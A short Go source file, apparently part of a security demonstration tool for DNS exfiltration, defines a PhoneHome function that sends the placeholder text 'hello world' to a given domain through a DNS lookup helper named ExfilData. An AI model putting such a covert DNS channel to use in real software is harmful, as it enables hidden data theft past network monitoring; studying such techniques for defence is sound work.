package cmd

import (
	"github.com/sam-bee/security-itsalwaysdns/dns_exfil_tool/pkg/messagesending"
)

func PhoneHome(mainDomain string) {
	exfilPayload := "hello world"
	dns := messagesending.DnsLookupTool{}
	messagesending.ExfilData(exfilPayload, mainDomain, &dns)
}
